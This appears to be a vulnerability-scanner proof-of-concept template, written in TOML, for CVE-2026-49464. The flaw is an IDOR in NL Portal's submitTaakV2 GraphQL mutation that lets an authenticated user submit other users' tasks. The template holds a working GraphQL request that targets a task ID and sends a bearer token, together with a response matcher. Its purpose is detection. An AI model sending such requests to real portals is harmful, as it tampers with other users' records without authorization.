[info]
author = "ave"
description = "检测 NL Portal taak 模块 submitTaakV2 GraphQL 接口的 IDOR 漏洞：已认证用户可通过修改 taskId 参数提交并篡改其他用户的待办任务，缺少所有权校验"
id = "POC-AVE-2026-0311"
name = "CVE-2026-49464 PoC"
severity = "high"
tags = ["ave-2026-0311"]
vuln_id = [
    "CVE-2026-49464",
    "AVE-2026-0311",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/graphql"
protocol = "http"

[poc.requests.body]
content = '{"query":"mutation($id:UUID!,$submission:SubmissionInput!){submitTaakV2(id:$id,submission:$submission){id status}}","variables":{"id":"00000000-0000-0000-0000-000000000000","submission":{"verzondenData":"{\"poc\":\"test\"}"}}}'
type = "raw"

[poc.requests.headers]
Authorization = "Bearer {{token}}"
Content-Type = "application/json"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["submitTaakV2"]
